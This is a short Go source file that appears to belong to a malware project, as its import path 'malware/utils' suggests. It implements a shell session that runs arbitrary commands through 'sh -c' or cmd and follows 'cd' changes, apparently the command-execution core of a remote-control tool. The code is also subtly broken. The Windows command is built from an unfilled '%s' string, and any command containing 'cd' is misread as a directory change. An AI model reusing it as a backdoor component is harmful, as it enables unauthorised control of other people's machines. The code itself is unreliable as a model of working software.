package commandsexecuter

import (
	"fmt"
	. "malware/utils"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type ShellSession struct {
	CurrentDir string
	Os         string
}

func (shell *ShellSession)ExecuteCommand (commandString string) {
	if strings.Contains(commandString, "cd") {
		parts := strings.Split(commandString, " ")
		if len(parts) > 1 {
			newDir := filepath.Join(shell.CurrentDir, parts[1])
			if _, err := os.Stat(newDir); err == nil {
				shell.CurrentDir = newDir
			}
		}
	}

	cmd := Ternary(shell.Os == "windows", exec.Command("cmd /C %s", commandString), exec.Command("sh", "-c", commandString))

	cmd.Dir = shell.CurrentDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Println("Error executing command:", err)
	}

}
